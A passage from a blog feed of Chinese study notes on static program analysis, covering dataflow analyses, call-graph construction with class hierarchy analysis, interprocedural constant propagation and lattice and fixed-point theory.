bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。</p><p><strong>说明</strong>：从下往上遍历基本块，黑色-初始化；红色-第1次；蓝色-第2次；绿色-第3次。</p><p><strong>结果</strong>：3次遍历后，IN[B]不再变化，遍历结束。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000125.webp" alt="img"></p><p>2-4-4-算法运行示例.png</p><hr><h2 id="5available-expressions-analysis-must-analysis">5.Available Expressions Analysis (must analysis)</h2><p><strong>问题定义</strong>：程序点p处的表达式<code>x op y</code>可用需满足2个条件，一是从entry到p点必须经过<code>x op y</code>，二是最后一次使用<code>x op y</code>之后，没有重定义操作数x、y。（如果重定义了x 或 y，如x = <code>a op2 b</code>，则原来的表达式<code>x op y</code>中的x或y就会被替代）。</p><p><strong>应用场景</strong>：用于优化，检测全局公共子表达式。</p><p><strong>抽象表示</strong>：程序中的n个表达式，用长度为n bit的向量来表示，1表示可用，0表示不可用。</p><p><strong>说明</strong>：属于forward分析。</p><h4 id="1公式分析-3">（1）公式分析</h4><p><strong>Transfer Function</strong>：OUT[B] = genB U (IN[B] - killB)</p><p><strong>理解</strong>：genB—基本块B中所有新的表达式（并且在这个表达式之后，不能对表达式中出现的变量进行重定义）–&gt;加入到OUT；killB—从IN中删除变量被重新定义的表达式。</p><p><strong>Control Flow</strong>：IN[B] = <img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000045.svg" alt="\cap">P a_predecessor_of_B OUT[P]</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000045.svg" alt="IN[B] = \cap_{P}\ _{a\ predecessor\ of\ B}OUT[P]"></p><p><strong>理解</strong>：从entry到p点的所有路径都必须经过该表达式。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000140.webp" alt="img"></p><p>2-5-1-可用表达式定义.png</p><p><strong>问题</strong>：该分析为什么属于must analysis呢？因为我们允许有漏报，不能有误报，比如以上示例中，改为x=3，去掉 b=e16*x，该公式会把该表达式识别为不可用。但事实是可用的，因为把x=3替换到表达式中并不影响该表达式的形式。这里虽然漏报了，但是不影响程序分析结果的正确性。</p><h4 id="2算法-3">（2）算法</h4><p><strong>目的</strong>：输入CFG，提前计算好genB和killB。</p><p><strong>方法</strong>：首先将OUT[entry]初始化为空，所有基本块的OUT[B]<strong>初始化为1…1</strong>。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为有循环，只要某块的OUT[B]变了，就意味后继块的IN[B]变了）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000334.webp" alt="img"></p><p>2-5-2-可用表达式算法.png</p><h4 id="3实例-3">（3）实例</h4><p><strong>抽象表示</strong>：程序中的n个表达式，用长度为n bit的向量来表示，1表示可用，0表示不可用。</p><p><strong>说明</strong>：黑色-初始化；红色-第1次；蓝色-第2次。</p><p><strong>结果</strong>：2次遍历后，OUT[B]不再变化，遍历结束。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000364.webp" alt="img"></p><p>2-5-3-算法运行示例.png</p><hr><h2 id="6三种分析技术对比">6.三种分析技术对比</h2><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available Expressions</th></tr></thead><tbody><tr><td><strong>Domain</strong></td><td>赋值语句</td><td>变量</td><td>表达式</td></tr><tr><td><strong>Direction</strong></td><td>forward</td><td>backward</td><td>forward</td></tr><tr><td><strong>May/Must</strong></td><td>May</td><td>May</td><td>Must</td></tr><tr><td><strong>Boundary</strong></td><td>OUT[Entry]=Φ</td><td>IN[Exit]=Φ</td><td>OUT[Entry]=Φ</td></tr><tr><td><strong>Initialization</strong></td><td>OUT[B]=Φ</td><td>IN[B]=Φ</td><td>OUT[B]=Π</td></tr><tr><td><strong>Transfer function</strong></td><td>OUT=gen U (IN - kill)</td><td>same</td><td>same</td></tr><tr><td><strong>Meet</strong></td><td>U</td><td>U</td><td>Π</td></tr></tbody></table><p><strong>问题</strong>：怎样判断是May还是Must？</p><p>Reaching Definitions表示只要从赋值语句到点p<strong>存在1条路径</strong>，则为reaching，结果不一定正确；Live Variables表示只要从点p到Exit<strong>存在1条路径</strong>使用了变量v，则为live，结果不一定正确；Available Expressions表示从Entry到点p的<strong>每一条路径</strong>都经过了该表达式，则为available，结果肯定正确。</p><p>作者：bsauce<br>链接：<a href="https://www.jianshu.com/p/45eb5e5565d5">https://www.jianshu.com/p/45eb5e5565d5</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过程间分析</title>
      <link href="/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
      <url>/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="目录">目录：</h3><ol><li>Motivation</li><li>调用图构建</li><li>过程间控制流分析</li><li>过程间数据流分析</li></ol><h3 id="重点">重点：</h3><p>学习如何利用类层级分析来构建调用图；过程间控制流/数据流分析；过程间的常量传播。</p><hr><h2 id="1motivation">1.Motivation</h2><p><strong>问题</strong>：<mark>过程内的分析未考虑函数调用，导致分析不精确</mark>。</p><p><strong>过程间分析</strong>：Inter-procedural Analysis，考虑函数调用，又称为全程序分析（Whole Program Analysis），需要构建调用图，加入Call edges和Return edges。</p><hr><h2 id="2调用图构建">2.调用图构建</h2><h4 id="1调用图">（1）调用图</h4><p><strong>定义</strong>：本质是调用边的集合，从调用点（call-sites）到目标函数（target methods / callees）的边。</p><p><strong>示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953225.webp" alt="img"></p><p>5-2-1-call_graph.png</p><p><strong>应用</strong>：是所有过程间分析（跨函数分析）的基础，程序优化，程序理解，程序调试。</p><h4 id="2面向对象语言的调用图构造java">（2）面向对象语言的调用图构造（Java）</h4><p><strong>代表性算法</strong>：从上往下精度变高，速度变慢，重点分析第1、4个算法。</p><ul><li>Class hierarchy analysis(CHA)</li><li>Rapid type analysis(RTA)</li><li>Variable type analysis(VTA)</li><li>Pointer analysis(k-CFA)</li></ul><p><strong>Java调用分类</strong>：</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:center"><strong>Static call</strong></th><th style="text-align:center"><strong>Special call</strong></th><th style="text-align:center"><strong>Virtual call</strong></th></tr></thead><tbody><tr><td style="text-align:left"><strong>指令</strong></td><td style="text-align:center">invokestatic</td><td style="text-align:center">invokespecial</td><td style="text-align:center">invokeinterface、 invokevirtual</td></tr><tr><td style="text-align:left">Receiver objects（返回后赋值的目标对象）</td><td style="text-align:center">×</td><td style="text-align:center">✓</td><td style="text-align:center">✓</td></tr><tr><td style="text-align:left"><strong>目标函数</strong></td><td style="text-align:center">Static函数</td><td style="text-align:center">构造函数、 私有函数、父类的实例函数</td><td style="text-align:center">其他实例函数</td></tr><tr><td style="text-align:left"><strong>目标函数个数</strong></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">≥1 (<strong>polymorphism</strong>多态性)</td></tr><tr><td style="text-align:left"><strong>何时确定</strong></td><td style="text-align:center">编译时</td><td style="text-align:center">编译时</td><td style="text-align:center">运行时</td></tr></tbody></table><p><strong>Method Dispatch</strong>：最难的是<strong>Virtual call</strong>，其中关键步骤是Method Dispatch，就是<strong>找到最终调用的实际函数</strong>。</p><p>virtual call在程序运行时才能得到，基于2个要素得到：</p><ol><li><p>reciever object的具体类型：<strong>c</strong></p></li><li><p>调用点的函数签名：<strong>m</strong>。（通过signature可以唯一确定一个函数）</p><ol><li>signature = 函数所在的类 + 函数名 + 描述符</li><li>描述符 = 返回类型 + 参数类型</li></ol><p>简记为C.foo(P, Q, R)</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953263.webp" alt="img"></p><p>5-2-2-virtual_call.png</p></li></ol><h4 id="3method-dispatchvirtual-call">（3）Method Dispatch（virtual call）</h4><p><strong>定义</strong>：用Dispatch(c, m)来模拟动态Method Dispatch过程，c表示reciever object，m表示函数签名。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953239.webp" alt="img"></p><p>5-2-3-Method_Dispatch.png</p><p><strong>解释</strong>：若该类的非抽象方法（实际可执行的函数主体）中包含和m相同名字、传递/返回参数的m‘，则直接返回；否则到c的父类中找。</p><p><strong>示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953264.webp" alt="img"></p><p>5-2-4-Dispatch示例.png</p><h4 id="4class-hirarchy-analysis-cha-类层级分析">（4）Class Hirarchy Analysis (CHA)  类层级分析</h4><p><strong>目的</strong>：根据每个virtual call 的 receiver varible 的<strong>声明类型</strong>来求解所有可能调用的目标函数。如 <code>A a = ... ;</code>  <code>a.foo();</code> 这个a就是receiver varible，声明类型就是A。假定a可以指向A以及A所有子类对象，CHA的过程就是从A和子类中去找目标函数。</p><p><strong>算法</strong>：Resolve(cs)——利用CHA算法找到调用点所有可能的调用目标。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953362.webp" alt="img"></p><p>5-2-5-CHA算法.png</p><p><strong>算法示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953350.webp" alt="img"></p><p>5-2-6-CHA算法示例.png</p><p><strong>算法应用</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953907.webp" alt="img"></p><p>5-2-7-CHA应用.png</p><p><strong>错误</strong>：以上b.foo()的调用目标 C.foo()和D.foo()是错误的，因为<strong>已经指定了是B类型</strong>，所以b.foo()根本不会调用C、D的foo()。因为CHA只考虑声明类型，也就是B，导致准确度下降。多态性就是说，父类可以引用子类的对象，如<code>B b=new C()</code>。</p><p>优缺点：CHA优点是速度快，只考虑声明类型，忽略数据流和控制流；缺点是准确度低。</p><p>总结：本类中有同名函数就在本类和子类找，没有就从父类找，接着找父类的子类中的同名函数（CHA分析）。</p><h4 id="5利用cha构造调用图">（5）利用CHA构造调用图</h4><p><strong>算法</strong>：<mark>遍历每个函数中的每个调用指令</mark>，调用CHA的Resolve()找到对应的目标函数和调用边，函数+调用边=调用图。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953911.webp" alt="img"></p><p>5-2-8-调用图构造算法.png</p><p><strong>示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953930.webp" alt="img"></p><p>5-2-9-调用图算法示例.png</p><hr><h2 id="3过程间控制流分析">3.过程间控制流分析</h2><p><strong>定义</strong>：过程间控制流图ICFG = CFG + (Call edges + Return edges)。</p><ul><li>Call edges：连接调用点和目标函数入口</li><li>Return edges：从return语句连到Return site（Call site后面一条语句）</li></ul><p><strong>示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953991.webp" alt="img"></p><p>5-3-ICFG示例.png</p><hr><h2 id="4过程间数据流分析">4.过程间数据流分析</h2><p><strong>说明</strong>：对ICFG进行数据流分析，没有标准的一套算法。</p><p><strong>对比</strong>：</p><table><thead><tr><th></th><th><strong>Intra</strong>procedural</th><th><strong>Inter</strong>procecdural</th></tr></thead><tbody><tr><td><strong>程序表示</strong></td><td>CFG</td><td>ICFG = CFGs + call &amp; return edges</td></tr><tr><td><strong>转换规则</strong></td><td>Node transfer</td><td>Node transfer + edge transfer</td></tr></tbody></table><p><strong>常量传播数据流分析</strong>：</p><ul><li>Node transfer：与过程内分析相同，对每个调用点，将等号左边部分去掉。</li><li>Call edge transfer：传参</li><li>Return edge transfer：传返回值</li></ul><p><strong>常量传播示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404240953005.webp" alt="img"></p><p>5-4-ICFG常量传播示例.png</p><p><strong>说明</strong>：黄色背景边必须有，从<code>b = addOne(a)</code>到<code>c=b-3</code>，a通过此边传递，b通过addOne()传递。若a也通过addOne()传递，会额外消耗系统资源。</p>]]></content>
      
      
      <categories>
          
          <category> 软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 过程间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据流分析2</title>
      <link href="/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%902/"/>
      <url>/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%902/</url>
      
        <content type="html"><![CDATA[<p>关于这一节<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fhahahaqwe123">zcc</a>的笔记已经够完美了，我就直接在他基础上记录了。</p><h3 id="目录">目录：</h3><ol><li>迭代算法-另一个角度</li><li>偏序（Partial Order）</li><li>上下界（Upper and Lower Bounds）</li><li>格（Lattice），半格（Semilattice），全格和格点积（Complete and Product Lattice）</li><li>数据流分析框架（via Lattice）</li><li>单调性与不动点定理（Monotonicity and Fixed Point Theorem）</li><li>迭代算法转化为不动点理论</li><li>从lattice的角度看may/must分析</li><li>分配性（Distributivity）和MOP</li><li>常量传播</li><li>Worklist算法</li></ol><h3 id="重点">重点：</h3><p>上节课是介绍了3种数据流分析迭代算法，本节课将从数学理论的角度来讨论数据流分析，加深对数据流分析算法的理解。</p><hr><h2 id="1迭代算法-另一个角度">1.迭代算法-另一个角度</h2><p><strong>本质</strong>：常见的数据流迭代算法，目的是通过迭代计算，最终得到一个稳定的不变的解。</p><h4 id="1理论">（1）理论</h4><p><strong>定义1</strong>：给定有k个节点（基本块）的CFG，迭代算法就是在每次迭代时，更新每个节点n的OUT[n]。</p><p><strong>定义2</strong>：设数据流分析的值域是V，可定义一个<strong>k-元组</strong>： (OUT[n1], OUT[n2], … , OUT[nk])。是集合 (V1 <img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\times"> V2 … <img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times"> Vk) （幂集，记为Vk）的一个元素，表示每次迭代后k个节点整体的值。</p><p><strong>定义3</strong>：每一次迭代可看作是Vk映射到新的Vk，通过转换规则和控制流来映射，记作函数F：Vk <img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\rightarrow"> Vk。</p><p><strong>迭代算法本质</strong>：通过不断迭代，直到相邻两次迭代的<strong>k-元组</strong>值一样，算法结束。</p><h4 id="2图示">（2）图示</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002572.webp" alt="img"></p><p>4-1-迭代算法数学化.png</p><p><strong>不动点</strong>：当Xi = F(Xi)时，就是不动点。</p><p><strong>问题</strong>：</p><ul><li>迭代算法是否一定会停止（到达不动点）？</li><li>迭代算法如果会终止，会得到几个解（几个不动点）？</li><li>迭代几次会得到解（到达不动点）？</li></ul><hr><h2 id="2偏序partial-order">2.偏序（Partial Order）</h2><p><strong>定义</strong>：给定偏序集(P, <img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\sqsubseteq">)，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">是集合P上的二元关系，若满足以下性质则为偏序集：</p><ul><li>∀<em>x</em>∈<em>P</em>,<em>x</em>⊑<em>x</em>                          自反性Reflexivity</li><li>∀<em>x</em>,<em>y</em>∈<em>P</em>, <em>x</em>⊑<em>y</em>∧<em>y</em>⊑<em>x</em> ⇒ <em>x</em>=y     对称性Antisymmetry</li><li>∀<em>x</em>,<em>y</em>∈<em>P</em>, <em>x</em>⊑<em>y</em>∧<em>y</em>⊑<em>z</em> ⇒ <em>x</em>⊑<em>z</em>     传递性Transitivity</li></ul><p><strong>例子</strong>：</p><ul><li>P是整数集，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">表示<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\leq">，是偏序集；若<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">表示&lt;，则显然不是偏序集。</li><li>P是英文单词集合，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">表示子串关系（可以存在两个元素不具有偏序关系，不可比性），是偏序集。</li></ul><hr><h2 id="3上下界upper-and-lower-bounds">3.上下界（Upper and Lower Bounds）</h2><h5 id="1定义">（1）定义</h5><p><strong>定义</strong>：给定偏序集(P, <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">)，且有P的子集S⊆P：</p><ul><li>∀<em>x</em>∈<em>S</em>, <em>x</em>⊑<em>u</em>, 其中<em>u</em>∈<em>P</em>，则u是子集S的上界 （<strong>注意，u并不一定属于S集</strong>）</li><li>∀<em>x</em>∈<em>S</em>, <em>l</em>⊑<em>x</em>, 其中<em>l</em>∈<em>P</em>，则l是S的下界</li></ul><p><strong>最小上界</strong>：least upper bound（lub 或者称为join），用⊔S表示。上确界？</p><p>定义：对于子集S的任何一个上界u，均有⊔S⊑u。</p><p><strong>最大下界</strong>：greatest lower bound（glb 或者称为meet），用⊓S表示。下确界？</p><p>定义：对于子集S的任何一个下界l，均有l⊑⊓S。</p><h5 id="2示例">（2）示例</h5><p>若S只包含两个元素，a、b（S = {a, b}）那么上界可以表示为a⊔b，下界可以表示为a⊓b。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002554.webp" alt="img"></p><p>4-3-1-上下确界示例.png</p><h5 id="3特性">（3）特性</h5><ul><li>并非每个偏序集都有上下确界。</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002553.webp" alt="img"></p><p>4-3-2-无下确界.png</p><ul><li><p>如果存在上下确界，则是唯一的。</p><p>利用传递性和反证法即可证明。</p></li></ul><hr><h2 id="4格lattice半格semilattice全格格点积complete-and-product-lattice">4.格（Lattice），（半格）Semilattice，全格，格点积（Complete and Product Lattice）</h2><p>都是基于上下确界来定义的。</p><h4 id="1格">（1）格</h4><p><strong>定义</strong>：给定一个偏序集(P,⊑)，∀a,b∈P，如果存在a⊔b和a⊓b，那么就称该偏序集为格。偏序集中的<strong>任意两个元素</strong>构成的集合均<strong>存在最小上界和最大下界</strong>，那么该偏序集就是格。</p><p><strong>例子</strong>：</p><ul><li>(S, ⊑)中S是整数子集，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">是<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\leq">，是格点；</li><li>(S, ⊑)中S是英文单词集，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">表示子串关系，不是格点，因为单词pin和sin就没有上确界；</li><li>(S, ⊑)中S是{a, b, c}的幂集，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">表示<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\subseteq">子集，是格点。</li></ul><h4 id="2半格">（2）半格</h4><p><strong>定义</strong>：给定一个偏序集(P,⊑)，∀a,b∈P：<br>当且仅当a⊔b存在（上确界），该偏序集叫做 join semilatice；</p><p>当且仅当a⊓b存在（下确界），该偏序集叫做 meet semilatice</p><h4 id="3全格">（3）全格</h4><p><strong>定义</strong>：对于格点 (S, <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">) （前提是格点）的任意子集S，⊔<em>S</em>上确界和⊓S下确界都存在，则为全格complete lattice。</p><p><strong>例子</strong>：</p><ul><li>P是整数集，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">是<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\leq">，不是全格，因为P的子集正整数集没有上确界。</li><li>(S, ⊑)中S是{a, b, c}的幂集，<img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">表示<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\subseteq">子集，是全格。</li></ul><p><strong>符号</strong>：<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002462.svg" alt="\top"> = <img src="mdPics/math" alt="\sqcup">P ，叫做top；<img src="mdPics/math" alt="\perp"> = <img src="mdPics/math" alt="\sqcap">P，叫做bottom。</p><p><strong>性质</strong>：有穷的格点必然是complete lattice。全格一定有穷吗？ 不一定，如实数界[0, 1]。</p><h4 id="4格点积">（4）格点积</h4><p><strong>定义</strong>：给定一组格，L1=(P1, <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">1)，L2=(P2, <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">2)，… ，Ln=(Pn, <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">n)，都有上确界<img src="mdPics/math" alt="\sqcup">i和下确界<img src="mdPics/math" alt="\sqcap">i，则定义格点积 Ln = (P, <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">)：</p><ol><li>P = P1 <img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times"> … <img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times"> Pn</li><li>(x1, … xn) <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq"> (y1, … yn) <img src="mdPics/math" alt="\Leftrightarrow"> (x1 <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq"> y1) <img src="mdPics/math" alt="\wedge"> … <img src="https://math.jianshu.com/math?formula=%5Cwedge" alt="\wedge"> (xn <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq"> yn)</li><li>(x1, … xn) <img src="mdPics/math" alt="\sqcup"> (y1, … yn) = (x1 <img src="https://math.jianshu.com/math?formula=%5Csqcup" alt="\sqcup"> y1, …, xn <img src="https://math.jianshu.com/math?formula=%5Csqcup" alt="\sqcup"> yn)</li><li>(x1, … xn) <img src="mdPics/math" alt="\sqcap"> (y1, … yn) = (x1 <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> y1, …, xn <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> yn)</li></ol><p><strong>性质</strong>：格点积也是格点；格点都是全格，则格点积也是全格。</p><hr><h2 id="5数据流分析框架via-lattice">5.数据流分析框架（via Lattice）</h2><p>数据流分析框架(D, L, F) ：</p><ul><li>D—方向</li><li>L—格点（值域V，meet <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> 或 join <img src="https://math.jianshu.com/math?formula=%5Csqcup" alt="\sqcup"> 操作）</li><li>F—转换规则V <img src="mdPics/math" alt="\rightarrow"> V。</li></ul><p>数据流分析可以看做是<strong>迭代算法</strong>对<strong>格点</strong> 利用<strong>转换规则</strong>和 <strong>meet/join操作</strong>。</p><hr><h2 id="6单调性与不动点定理monotonicity-and-fixed-point-theorem">6.单调性与不动点定理（Monotonicity and Fixed Point Theorem）</h2><p>目标问题：迭代算法一定会停止（到达不动点）吗？</p><p>（1）单调性</p><p><strong>定义</strong>：函数f: L <img src="mdPics/math" alt="\rightarrow"> L，满足∀x,y∈L，x⊑y⇒f(x)⊑f(y)，则为单调的。</p><p>（2）不动点理论</p><p><strong>定义</strong>：给定一个<strong>完全lattice(L,⊑)</strong>，如果f:L→L是<strong>单调</strong>的，并且<strong>L有限</strong></p><p>那么我们能得到最小不动点，通过迭代：f(⊥),f(f(⊥)),…,fk(⊥)直到找到最小的一个不动点。</p><p>同理 我们能得到最大不动点，通过迭代：f(⊤),f(f(⊤)),…,fk(⊤)直到找到最大的一个不动点。</p><p>（3）证明</p><p>不动点的存在性；</p><p>最小不动点证明。</p><hr><h2 id="7迭代算法转化为不动点理论">7.迭代算法转化为不动点理论</h2><p><strong>问题</strong>：我们如何在理论上证明<strong>迭代算法有解</strong>、<strong>有最优解</strong>、<strong>何时到达不动点</strong>？那就是将迭代算法转化为<strong>不动点理论</strong>。因为不动点理论已经证明了，单调、有限的完全lattice，存在不动点，且从⊤开始能找到最大不动点，从⊥开始能找到最小不动点。</p><p><strong>目标</strong>：证明迭代算法是一个<strong>完全lattice(L, <img src="https://math.jianshu.com/math?formula=%5Csqsubseteq" alt="\sqsubseteq">)</strong>，是<strong>有限</strong>的，<strong>单调</strong>的。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002789.webp" alt="img"></p><p>4-7-1-迭代算法.png</p><h4 id="1完全lattice证明">（1）完全lattice证明</h4><p>根据第5小节，迭代算法每个<strong>节点（基本块）的值域</strong>相当于一个<strong>lattice</strong>，每次迭代的<strong>k个基本块的值域</strong>就是一个<strong>k-元组</strong>。k-元组可看作<strong>lattice积</strong>，根据格点积性质：若Lk中每一个lattice都是完全的，则Lk也是<strong>完全</strong>的。</p><h4 id="2l是有限的">（2）L是有限的</h4><p>迭代算法中，值域是0/1，是有限的，则lattice有限，则Lk也有限。</p><h4 id="3f是单调的">（3）F是单调的</h4><p>函数F：BB中转换函数fi：L → L   +    BB分支之间的控制流影响（汇聚是join <img src="https://math.jianshu.com/math?formula=%5Csqcup" alt="\sqcup"> / meet <img src="https://math.jianshu.com/math?formula=%5Csqcap" alt="\sqcap"> 操作，分叉是拷贝操作）。</p><ol><li>转换函数：BB的gen、kill是固定的，值域一旦变成1，就不会变回0，显然单调。</li><li>join/meet操作：L × L → L 。证明：∀x,y,z∈L，且有x⊑y需要证明x⊔z⊑y⊔z。</li></ol><p><strong>总结</strong>：迭代算法是完全lattice，且是有限、单调的，所以一定有解、有最优解。</p><h4 id="4算法何时到达不动点">（4）算法何时到达不动点？</h4><p><strong>定义</strong>：<strong>lattice高度</strong>—从lattice的top到bottom之间最长的路径。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002813.webp" alt="img"></p><p>4-7-3-lattice高度定义.png</p><p><strong>最坏情况迭代次数</strong>：设有n个块，每次迭代只有1个BB的OUT/IN值的其中1位发生变化（则从top→bottom这1位都变化），则最多迭 (<strong>n × h</strong>) 次。</p><hr><h2 id="8从lattice的角度看maymust分析">8.从lattice的角度看may/must分析</h2><p><strong>说明</strong>：may 和 must 分析算法都是从不安全到安全（是否安全取决于safe-aprroximate过程），从准确到不准确。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002848.webp" alt="img"></p><p>4-8-1-must_may分析特点.png</p><h4 id="1may分析">（1）may分析</h4><p>以 Reaching Definitions分析为例：</p><ol><li>从<img src="mdPics/math" alt="\perp"> 开始，<img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp"> 表示所有定义都不可达，是<strong>不安全</strong>的结果（因为这个分析的应用目的是为了查错，查看变量是否需要初始化。首先在Entry中给每个变量一个假定义，标记所有变量为都为未初始化状态，<img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp">表示所有的假定义都无法到达，说明所有变量在中间都进行了赋值，那就不需要对任何变量进行初始化，这是不安全的，可能导致未初始化错误）。</li><li><img src="mdPics/math" alt="\top">表示所有Entry中的假定义都可达，从查错角度来说，需要对每个变量都进行初始化，非常<strong>安全</strong>！但是这句话没有用，我都要初始化的话还做这个分析干嘛？</li><li>Truth：表明最准确的验证结果，假设{a,c}是truth，那么包括其以上的都是safe的，以下的都是unsafe，就是上图的阴影和非阴影。</li></ol><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241002864.webp" alt="img"></p><p>4-8-2-Truth示例.png</p><ol><li>从<img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp"> 到<img src="mdPics/math" alt="\top"> ，得到的<strong>最小不动点</strong>最准确，离Truth最近。上面还有多个不动点，越往上越不准。</li></ol><h4 id="2must分析">（2）must分析</h4><p>以available expressions分析为例：</p><ol><li>从<img src="mdPics/math" alt="\top">开始，表示所有表达式可用。如果用在表达式计算优化中，那么有很多已经被重定义的表达式也被优化了（实际上不能被优化），那么该优化就是错误的，<strong>不安全</strong>！</li><li><img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp">表示没有表达式可用，都不需要优化，很<strong>安全</strong>！但没有用。</li><li>从<img src="mdPics/math" alt="\top">到<img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp">，就是从不安全到安全，存在一个Truth，代表准确的结果。</li><li>从<img src="mdPics/math" alt="\top">到<img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp">，达到一个<strong>最大不动点</strong>，离truth最近的最优解。</li></ol><p>迭代算法转化到lattice上，may/must分析分别初始化为最小值<img src="https://math.jianshu.com/math?formula=%5Cperp" alt="\perp">和最大值<img src="mdPics/math" alt="\top">，最后求最小上界/最大下界。</p><hr><h2 id="9分配性distributivity和mop">9.分配性（Distributivity）和MOP</h2><p><strong>目的</strong>：MOP（meet-over-all-paths）衡量迭代算法的精度。</p><h4 id="1概念">（1）概念</h4><p><strong>定义</strong>：最终将所有的路径一起来进行join/meet操作。</p><p><strong>路径P</strong> = 在cfg图上从entry到基本块si的一条路径（P = Entry → s1 → s2 → … → s~i 